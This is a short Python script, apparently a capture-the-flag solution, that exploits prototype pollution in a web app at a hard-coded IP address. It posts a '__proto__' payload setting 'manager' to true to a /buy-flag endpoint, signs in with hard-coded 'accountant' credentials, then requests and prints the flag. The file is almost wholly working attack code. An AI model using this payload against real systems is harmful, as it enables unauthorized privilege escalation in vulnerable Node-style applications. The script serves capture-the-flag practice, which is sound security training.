import requests

base_url = "http://35.232.108.81/"
#base_url = "http://localhost:3000/"
username = "accountant"
password = "accountant"
session = requests.Session()

login_data = {"username": username, "password": password}

#payload = { "__proto__": { "manager": True } }
payload = { "__proto__": { "manager": True, "id":4 } }
pollute_response = session.post(f"{base_url}/buy-flag", json=payload)


login_response = session.post(f"{base_url}/signin", data=login_data)

if login_response.status_code == 200:
    print("Login successful!")
else:
    print("Login failed!")
    exit()

flag_response = session.post(f"{base_url}/buy-flag", data={"id": 4})

if flag_response.status_code == 200:
    print("Flag: ", flag_response.text)